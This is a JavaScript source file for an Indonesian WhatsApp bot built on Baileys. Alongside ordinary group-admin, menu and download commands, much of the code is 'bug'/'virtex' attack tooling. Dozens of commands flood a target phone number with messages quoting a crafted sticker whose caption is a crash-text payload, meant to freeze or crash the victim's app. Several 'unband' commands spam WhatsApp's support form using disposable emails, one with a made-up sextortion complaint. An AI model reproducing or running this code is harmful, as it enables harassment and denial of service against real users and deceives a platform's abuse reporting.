require(`./setting.js`)
const { baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@adiwajshing/baileys")
const { getGroupAdmins, fetchJson, reSize, generateProfilePicture, sleep, runtime, tanggal, formatp} = require("./basexd/lib/functions.js")
const { exec, spawn, execSync } = require("child_process")
const cheerio = require("cheerio")
const chalk = require("chalk")
const util = require("util")
const os = require("os")
const axios = require("axios")
const fs = require("fs")
const syntaxerror = require("syntax-error")
const Jimp = require("jimp")
const PhoneNumber = require("awesome-phonenumber")
const speed = require("performance-now")
const moment = require("moment-timezone")
//=====================================================//
const { bugmenu } = require("./basexd/comand/bugmenu") 
const { othermenu } = require("./basexd/comand/othermenu")
const { ownermenu } = require("./basexd/comand/ownermenu")
const { listmenu } = require("./basexd/comand/listmenu")
const { buttonvirus } = require("./basexd/virtex/buttonvirus")
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
sanbot = fs.readFileSync("./basexd/gambar/virus.webp")
//=====================================================//   
module.exports = xd = async (xd, m, chatUpdate, store) => {
try {
const type = getContentType(m.message)
const content = JSON.stringify(m.message)
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.m || quoted).mimetype || ''
const body = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const isMedia = /image|video|sticker|audio/.test(mime)
//=====================================================//
const isGroup = from.endsWith('@g.us')
const groupMetadata = isGroup? await xd.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participants = isGroup? await groupMetadata.participants : ""
const groupAdmins = isGroup? await participants.filter(v => v.admin !== null).map(v => v.id) : ""
const groupMembers = isGroup? groupMetadata.participants : ""
const isGroupAdmins = isGroup? groupAdmins.includes(m.sender) : false
const botNumber = await xd.decodeJid(xd.user.id)
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false
const sender = m.key.fromMe ? (xd.user.id.split(':')[0]+'@s.whatsapp.net' || xd.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isPrem = premium.includes(senderNumber) || isBot
const isOwner = [botNumber, ...global.ownerNomer].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const jamwib = await moment.tz('Asia/Jakarta').format('HH')
const menitwib = await moment.tz('Asia/Jakarta').format('mm')
const detikwib = await moment.tz('Asia/Jakarta').format('ss')
const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const kays = (`${jamwib}:${menitwib}:${detikwib}`)
const reply = (teks) => {
xd.sendMessage(from, { text : teks }, { quoted : m })
}
//=====================================================//
if (isCmd && m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); 
}
//=====================================================//
if (isCmd && !m.isGroup) { 
console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); 
}
//=====================================================//
const stick = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"caption": `${buttonvirus}`,
"jpegThumbnail": sanbot,
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}}}
//=====================================================//
ppuser = 'https://raw.githubusercontent.com/JasRunJ/filenya/master/a4cab58929e036c18d659875d422244d.jpg'
ppnyauser = await reSize(ppuser, 200, 200)
//=====================================================//
let flok = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `SanXd : ${runtime(process.uptime())}`,jpegThumbnail: fs.readFileSync('./basexd/gambar/thumb.jpg')}}}
//=====================================================//
if (command) {
xd.sendPresenceUpdate('composing', from)
xd.readMessages([m.key])
}
//=====================================================//
if (!xd.public) {
if (!m.key.fromMe) return
}
//=====================================================//
switch (command) {
case "menu": {
sanxd1 = `Hallo Bro @${sender.split("@")[0]}

${listmenu}`
await xd.sendMessage(from, {text:sanxd1, mentions:[sender]}, {quoted:flok}) 
}
break
//=====================================================//
case "bugmenu": {
inibg = `${bugmenu}`
await xd.sendMessage(from, {image: thumb, caption: inibg}, {quoted: flok})
}
break
//=====================================================//
case "ownermenu": {
sanxd2 = `Hallo Bro @${sender.split("@")[0]}

${ownermenu}`
await xd.sendMessage(from, {text:sanxd2, mentions:[sender]}, {quoted:flok}) 
}
break
//=====================================================//
case "othermenu": {
sanxd3 = `Hallo Bro @${sender.split("@")[0]}

${othermenu}`
await xd.sendMessage(from, {text:sanxd3, mentions:[sender]}, {quoted:flok}) 
}
break
//=====================================================//
case "self":{
if (!isOwner) return reply(mess.owner)
xd.public = false
reply(`Mode Self`)
}
break
//=====================================================//
case "self":{
if (!isOwner) return reply(mess.owner)
xd.public = true
reply(`Mode Public`)
}
break
//=====================================================//
case "tiktokmp3":{
if (!text) return reply( `Example : ${prefix + command} link`)
if (!args[0]) return reply(`Kirim perintah:\n${prefix+command} link tiktok video\n\nContoh penggunaan:\n${prefix+command} https://vt.tiktok.com/ZS8bq76jP/`)
reply(mess.wait) 
require('./lib/tiktok').Tiktok(q).then( data => {
xd.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
//=====================================================//
case "tiktokmp4":{ 
if (!text) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Tiktok Bukan Kayak Gtu Cuy !!`)
reply(mess.wait) 
require('./lib/tiktok').Tiktok(q).then( data => {
xd.sendMessage(m.chat, { caption: `DONE!`, video: { url: data.watermark }, footer: botNama, mentions: [m.sender] })
})
}
break
//=====================================================//
case "linkgroup": case "linkgc":{
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
let response = await xd.groupInviteCode(m.chat)
reply("https://chat.whatsapp.com/" + response) 
}
break
//=====================================================//
case "revoke": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin) 
if (!isBotAdmins) return reply(mess.botAdmin)
await xd.groupRevokeInvite(m.chat)
.then(res => {
reply(`Berhasil Meriset Link Tautan Group ${groupMetadata.subject}`)
}).catch((err) => reply(jsonformat(err)))
}
break
//=====================================================//
case "delprem":
if (!isGroup) return reply(mess.group) 
if (!isGroupAdmins) return reply(mess.admin)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`Nomer ${ya} Sudah Tidak Menjadi User Premium`)
break
//=====================================================//
case "addprem":
if (!isGroup) return reply(mess.group) 
if (!isGroupAdmins) return reply(mess.admin) 
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await xd.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(bnnd)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`Nomor ${bnnd} Telah Menjadi User Premium`)
break
//=====================================================//
case "open": {
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
xd.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
}
break
//=====================================================//
case "close": {
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
xd.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
}
break
//=====================================================//
case "tutor": {
inig = `Nih\nhttps://s.id/tutorialcarangebug

*Caranya :*
1.Download Dulu Video Tutor Nya
2.Tonton Video Nya Dan Pahami
`
xd.sendMessage(from, {text: inig}, {quoted: flok})
}
break
//=====================================================//
case "ping": {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
reply(respon)
}
break
//=====================================================//
case "on":{
yahu = `Bot Sudah Aktif`
reply(yahu)
}
break
//=====================================================//
case "runtime": {
bangv = `*Runtime Bot :*\n${runtime(process.uptime())}`
reply(bangv)
}
break
//=====================================================//
case '🌷': 
case '🔥': 
case '🖕': 
case '⚡': 
case '☠️': 
case '💥': 
case '🥶': 
case '💣': 
if (!isGroup) return reply(mess.group) 
if (args.length < 1) return reply(`Contoh ${command} 6285793433348`)
if (!text) return 
num = `${text}`+'@s.whatsapp.net'
let cekni = await xd.onWhatsApp(num + `@s.whatsapp.net`)
if (cekni.length == 0) return reply(`Masukan Nomer Yang Valid Yang Terdaftar Di WhatsApp`)
txts = `*Sukses Mengirim ${command}*\n*Jangan Lupa Jeda 5 Menit*`
reply(txts) 
jumlah = `${jumlahbugemoji}`
for (let i = 0; i < jumlah; i++) {
xd.sendMessage(num, 
{text: ' '},
{quoted:stick})
await sleep(2000) 
}
break
//=====================================================//
case 'virtex1':
case 'virtex2':
case 'virtex3':
case 'sanvirtex': 
case 'sanphilip': 
case 'santrava': 
case 'sanslayer': 
case 'sanganas': 
case 'sanbutton': 
case 'sanmental': 
case 'santet':
case 'sanpoll':
case 'santroli':  
case 'sanmex': 
case 'sanbom': 
case 'sanhole':
case 'sansuhu':  
case 'sanbully': 
case 'sanjago': 
case 'sancrash': 
case 'sanepep': 
case 'sendto':
case 'sendtrol':
case 'sendton':
case 'sendvirus':
case 'sendhard':
case 'sendlokas':
case 'sendinvite':
case 'senddocu':
case 'sendboom':
case 'sendbuglist':
if (!isGroup) return reply(mess.group) 
if (args.length < 1) return reply(`Contoh ${command} 6285793433348`)
if (!text) return 
num = `${text}`+'@s.whatsapp.net'
let ceknya = await xd.onWhatsApp(num + `@s.whatsapp.net`)
if (ceknya.length == 0) return reply(`Masukan Nomer Yang Valid Yang Terdaftar Di WhatsApp`)
txts = `*Sukses Mengirim ${command}*\n*Jangan Lupa Jeda 5 Menit*`
reply(txts)
jumlah = `${jumlahbugtext}`
for (let i = 0; i < jumlah; i++) {
xd.sendMessage(num, 
{text: ' '},
{quoted:stick})
await sleep(2000) 
}
break
//=====================================================//
case "qc": {
if (!quoted){
const getname = await xd.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppnyauser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
xd.sendImageAsSticker(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppnyauser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
xd.sendImageAsSticker(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${command} text atau reply pesan dengan perintah ${command}`)
}
}
break
//=====================================================//
case 'unbandv1': {
if (!isOwner) return reply(mess.owner) 
if (!q) return reply(`Contoh ${command} 6285798338388`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "I was unfairly banned, I need to work, my WhatsApp is business and if I can't work because of your mistake I'll profess everyone, and I'll win this process, you they are taking away my right to work and I am going to call a lawyer..")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
reply(`Wait Prosess Unband... `) 
}
break
//=====================================================//
case 'unbandv2': {
if (!isOwner) return reply(mess.owner) 
if (!q) return reply(`Contoh ${command} 6285798338388`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Mi nombre es Lorena y me gustaría reportar una amenaza. Dijo que me banearía si no enviaba fotos íntimas, y me baneó de WhatsApp por no enviar mis desnudos y no tener sexo por internet. Me gustaría que me levantaran la prohibición, de lo contrario procederé con acciones legales.")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
reply(`Wait Prosess Unband... `) 
}
break
//=====================================================//
case 'unbandv3': {
if (!isOwner) return reply(mess.owner) 
if (!q) return reply(`Contoh ${command} 6285798338388`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "yth WhatsApp,Akun WhatsApp Saya Tiba Tiba Ke Blokir Mohon Bantuannya Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
reply(`Wait Prosess Unband... `) 
}
break
//=====================================================//
case 'unbandv4': {
if (!isOwner) return reply(mess.owner) 
if (!q) return reply(`Contoh ${command} 6285798338388`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "KENAPA AKUN WHATSAPP SAYA DI BLOKIR? ")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
reply(`Wait Prosess Unband... `) 
}
break
//=====================================================//
case 'unbandv5': {
if (!isOwner) return reply(mess.owner) 
if (!q) return reply(`Contoh ${command} 6285798338388`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "What's Is Whatsapp My Account WhatsApp Me Blocked?")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
reply(`Wait Prosess Unband... `) 
}
break
//=====================================================//
case 'unbandv6': {
if (!isOwner) return reply(mess.owner) 
if (!q) return reply(`Contoh ${command} 6285798338388`)
 var axioss = require ("axios")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hallo WhatsApp Mengapa Akun WhatsApp Saya Di Blockir?")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
reply(`Wait Prosess Unband... `) 
}
break
//=====================================================//
default:
}
if (budy.startsWith('>')) {
if (!isOwner) return khususOwner()
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (err) {
console.log(util.format(err))
let e = String(err)
xd.sendMessage(`${ownerNomer}@s.whatsapp.net`, {text:e})
}
}
//=====================================================//
let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.greenBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})